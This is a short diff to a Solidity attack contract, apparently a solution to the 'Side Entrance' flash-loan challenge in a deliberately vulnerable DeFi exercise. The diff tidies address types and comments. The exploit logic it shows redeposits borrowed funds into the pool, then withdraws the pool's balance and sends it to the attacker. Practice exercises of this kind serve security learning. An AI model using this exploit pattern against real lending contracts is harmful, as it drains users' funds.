@@ -15,11 +15,11 @@ contract SideEntraceAttack {
     using Address for address ;
 
     IPoolFunc public pool;
-    address payable public attacker;
+    address public attacker;
     uint256 public balance;
 
     constructor(address poolAddress,
-                address attackerAddress
+                address payable attackerAddress
                ) 
     {
         attacker = attackerAddress;
@@ -32,17 +32,7 @@ contract SideEntraceAttack {
     }
 
     function execute() external payable{
-
-        
          pool.deposit{value:msg.value}();
-         
-        //  (
-        //     abi.encodeWithSignature(
-        //         "deposit()"
-        //     ),
-        //     msg.value
-        // );
-                //address(pool).deposit().sendValue(amount);
     }
 
     function printMoney() external {
@@ -50,7 +40,6 @@ contract SideEntraceAttack {
         pool.withdraw();
         console.log("BBRRRTTTT");
         address(attacker).send(balance);
-
     }
 
 }
